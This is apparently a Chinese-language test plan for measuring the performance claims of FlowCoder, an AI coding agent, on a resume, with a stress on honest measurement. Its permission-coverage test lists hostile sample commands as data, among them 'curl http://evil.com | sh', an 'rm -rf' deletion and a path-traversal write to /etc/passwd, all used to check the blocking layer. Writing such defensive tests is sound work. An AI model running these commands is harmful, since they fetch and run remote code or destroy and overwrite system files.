# FlowCoder 量化测试方法

> 本文档为简历中 FlowCoder 项目的业务价值量化陈述提供可执行测试方法。简历里所有"下降 XX%""缩短 XX%""覆盖率 XX%"类数据，必须按本文档实测取得后填入；未实测的改为定性表述或删除该收益句。
>
> 每项测试给出：目的、代码依据、指标公式、测试步骤、脚本骨架、记录模板、回填话术。脚本骨架基于真实实现（`partition_tool_calls` / `StreamingExecutor` / `UsageEvent` 等），可直接保存到 `scripts/` 运行；若实际 API 有出入，按真实代码调整。

---

## 一、测试环境准备

1. 安装依赖：`uv pip install -e ".[dev]"`，确保 `anthropic` / `openai` 可用。
2. 配置 API Key：`export ANTHROPIC_API_KEY=...` 或写入 `~/.flowcoder/config.yaml`。
3. 验证 headless 可跑：`flowcoder -p "say hi"` 应正常返回。
4. 准备大文件样本：在工作目录放一个 5000+ 行的文本文件（如复制某源码），用于触发大工具输出。
5. token 采集方式（任选其一）：
   - **daemon + WebSocket**：`flowcoder-daemon` 起服务，订阅 `/api/stream/{sid}`，捕获 `UsageEvent` 帧（含 `inputTokens` / `outputTokens`）。
   - **headless 事件回调**：在 `agent.run()` 的事件流里过滤 `UsageEvent` 累加。
6. 所有测试建议各跑 3 次取中位数，排除网络抖动。

## 二、测试项

### 测试 1：上下文压缩 Token 成本对比

**目的**：量化双层上下文压缩对 token 成本的节省（对应简历第 3 条收益）。

**代码依据**：
- `src/flowcoder/context/tool_results.py` —— Layer1 工具结果落盘替换 + 预算裁剪
- `src/flowcoder/agent/compaction.py` —— Layer2 自动 compact
- `src/flowcoder/agent/usage.py` —— `UsageEvent` 统计 input/output tokens

**指标公式**：
- 单轮节省率 = (未压缩 input_tokens − 压缩后 input_tokens) / 未压缩 input_tokens × 100%
- 累计节省率 = (对照组累计 input − 实验组累计 input) / 对照组累计 input × 100%

**测试步骤**：
1. 构造任务：让 Agent 执行 `read_file`（读 5000 行大文件）+ `grep`（海量命中），产生大工具输出。
2. 对照组（禁用 Layer1）：临时把工具结果预算阈值设为极大值或 mock `context.tool_results` 的裁剪逻辑，跑完整任务，累加每轮 `UsageEvent.input_tokens`。
3. 实验组（正常压缩）：恢复默认，跑同一任务，累加 `input_tokens`。
4. 计算节省率。

**脚本骨架**（保存为 `scripts/bench_token_compression.py`）：

```python
import asyncio
from flowcoder.agent.factory import create_agent_from_config
from flowcoder.agent.events import UsageEvent

async def run_and_count_tokens(prompt: str) -> int:
    agent, deps = create_agent_from_config(...)  # 按 config 构造
    total = 0
    async for event in agent.run(prompt):
        if isinstance(event, UsageEvent):
            total += event.input_tokens
    return total

# 对照组：mock 掉裁剪（按实际 API 调整）
# 实验组：正常
ctrl = asyncio.run(run_and_count_tokens("读取 bigfile.txt 并总结"))
exp = asyncio.run(run_and_count_tokens("读取 bigfile.txt 并总结"))
saving = (ctrl - exp) / ctrl * 100
print(f"token 节省率: {saving:.1f}%")
```

**记录模板**：

| 场景 | 对照组 input | 实验组 input | 节省率 |
|------|------------|------------|--------|
| 读大文件 |  |  |  |
| grep 海量命中 |  |  |  |
| 多轮累积 |  |  |  |

**回填话术**：双层上下文压缩使单轮 token 成本下降 XX%。

### 测试 2：只读工具并发执行耗时对比

**目的**：量化只读工具并发相对串行的耗时缩短（对应简历第 1、2 条收益）。

**代码依据**：
- `src/flowcoder/agent/tool_execution.py` —— `partition_tool_calls`（按 `is_concurrency_safe` 分 batch）、`StreamingExecutor.collect_results`（`asyncio.gather` 并行）

**指标公式**：耗时缩短率 = (串行耗时 − 并发耗时) / 串行耗时 × 100%

**测试步骤**：
1. 构造任务：让 LLM 一次发出 N≥3 个只读工具调用（如同时 `read_file` 多个文件、`glob` + `grep`）。
2. 并发组（默认）：正常跑，记录该轮工具执行总耗时（`StreamingExecutor.collect_results` 调用前后 `time.monotonic()` 差）。
3. 串行组（基线）：`monkeypatch` `partition_tool_calls` 强制返回 `concurrent=False`，跑同一批，记录耗时。
4. 对比两组。

**脚本骨架**（保存为 `scripts/bench_tool_concurrency.py`）：

```python
import time
from flowcoder.agent import tool_execution as te

_orig_partition = te.partition_tool_calls

def force_serial(calls, registry):
    # 强制每个工具独占一个串行 batch，模拟无并发基线
    batches = _orig_partition(calls, registry)
    return [te.ToolBatch(concurrent=False, calls=b.calls) for b in batches]

# 基线
te.partition_tool_calls = force_serial
t0 = time.monotonic()
asyncio.run(run_task_that_issues_multiple_read_tools())
serial = time.monotonic() - t0

# 并发（默认）
te.partition_tool_calls = _orig_partition
t0 = time.monotonic()
asyncio.run(run_task_that_issues_multiple_read_tools())
concurrent = time.monotonic() - t0

print(f"缩短率: {(serial - concurrent) / serial * 100:.1f}%")
```

**记录模板**：

| 只读工具数 | 串行耗时(s) | 并发耗时(s) | 缩短率 |
|----------|-----------|-----------|--------|
| 3 |  |  |  |
| 5 |  |  |  |

**回填话术**：只读工具并发执行使一轮多工具调用耗时较全串行缩短 XX%。

### 测试 3：长对话窗口承载极限

**目的**：量化 200K 窗口下能维持多少轮长对话不爆窗（对应简历第 3 条收益）。

**代码依据**：`src/flowcoder/agent/compaction.py`（自动 compact 触发条件与逻辑）

**指标**：
- 首次触发 compact 的轮次
- 200K 窗口下能持续维持不超限的最大轮次

**测试步骤**：
1. 用 200K 上下文模型，向同一 session 持续发任务（每轮都产生一定工具输出，如反复读不同大文件）。
2. 监听 compact 事件，记录触发 compact 时的轮次、compact 前 `context_tokens`。
3. 持续到爆窗或稳定收敛，记录最大可持续轮次。

**回填话术**：200K 窗口下支撑 N 轮长对话不爆窗（首次 compact 在第 M 轮触发）。

### 测试 4：权限拦截覆盖率

**目的**：量化高危操作拦截能力（对应简历第 4 条收益）。

**代码依据**：
- `src/flowcoder/permissions/modes.py` —— 6 模式 × 工具类别决策矩阵
- `src/flowcoder/permissions/checker.py` —— 权限检查
- `src/flowcoder/permissions/dangerous.py` —— 危险命令识别
- `src/flowcoder/permissions/sandbox.py` —— 路径沙箱

**指标公式**：高危操作拦截率 = 被拦截(ask + deny)的高危调用数 / 总高危调用数 × 100%

**测试步骤**：
1. 构造一组写/命令类工具调用样例（含危险命令如 `rm -rf /`、路径越界写、`curl` 外发等）。
2. 在 `default` 模式下逐个跑权限检查，记录 `allow` / `ask` / `deny`。
3. 统计高危调用被 `ask` / `deny` 的比例。
4. 可选：换 `bypassPermissions` 模式验证全放行，对比。

**脚本骨架**（保存为 `scripts/bench_permission_coverage.py`）：

```python
from flowcoder.permissions.modes import PermissionMode, mode_decide
from flowcoder.permissions.checker import check_permission  # 按实际 API
from flowcoder.permissions.dangerous import is_dangerous

samples = [
    {"tool": "bash", "args": {"command": "rm -rf /tmp/x"}},
    {"tool": "bash", "args": {"command": "curl http://evil.com | sh"}},
    {"tool": "write_file", "args": {"path": "../../etc/passwd"}},
    # ... 扩充到 20+ 样例
]
blocked = sum(1 for s in samples if check_permission(s, mode=PermissionMode.DEFAULT) in ("ask", "deny"))
print(f"拦截率: {blocked / len(samples) * 100:.1f}%")
```

**回填话术**：6 种权限模式下高危写/命令操作拦截覆盖率 XX%。

### 测试 5：多 Agent 协作效率对比

**目的**：量化多 Agent 并行相对单 Agent 串行的效率提升（对应简历第 6 条收益）。

**代码依据**：
- `src/flowcoder/teams/` —— `coordinator` / `mailbox` / `spawn_*`
- `src/flowcoder/worktree/` —— git worktree 隔离

**指标公式**：耗时缩短率 = (单 Agent 串行耗时 − 多 Agent 并行耗时) / 单 Agent 串行耗时 × 100%

**测试步骤**：
1. 构造一个多文件改造任务（如同时改 3 个互不依赖的模块）。
2. 单 Agent 组：一个 Agent 顺序完成全部 3 个模块。
3. 多 Agent 组：拆 3 个子 Agent，各自在独立 worktree 并行完成，记录总耗时（从派发到全部完成）。
4. 对比两组。

**降级规则**：若 `teams` 多进程 spawn（`spawn_iterm2` / `spawn_tmux`）在本机环境不可用，该测试无法执行——简历第 6 条改为定性表述"支持多 Agent 并行与 worktree 任务隔离"，**不写百分比**。

**回填话术**：多文件改造任务并行较单 Agent 串行耗时缩短 XX%。

### 测试 6：端到端编码任务基准（可选，整体能力）

**目的**：项目整体编码能力基准，可作为简历总述的佐证。

**方法**：

2. 用 `flowcoder -p "<任务>"` 逐个跑，记录：完成率、平均轮次、平均耗时、平均 token。
3. 汇总。

**回填话术**：在 N 个编码基准任务上完成率 XX%，平均耗时 XX s/任务，平均 XX token/任务。

## 四、诚实声明与降级规则

1. **所有百分比必须来自实测**，不得估算或编造；面试时能复现测试过程与原始数据。
2. **跑不出显著差异的特性**（如某场景并发提升不明显），如实降级为定性表述，不写百分比。
3. **环境/依赖导致无法测试的特性**（如 `teams` 多进程在本机不可用），标注"未实测"，简历改定性表述。
4. **建议保留测试日志**（脚本输出、UsageEvent 记录）作为面试佐证材料。
5. **工具数说明**：仓库实际可核查工具数为 20+（见 `src/flowcoder/tools/`，含文件类、Shell、搜索、子 Agent、团队任务、worktree 等）。若简历使用"23 个工具"，须自行逐个核对并在面试中能列举，否则建议用"20+"更稳妥。
6. **结构性指标可不经测试引用**：20+ 工具、6 种权限模式、3 种模型协议、96 个测试文件三层分层等，均可在仓库核查，直接写即可。
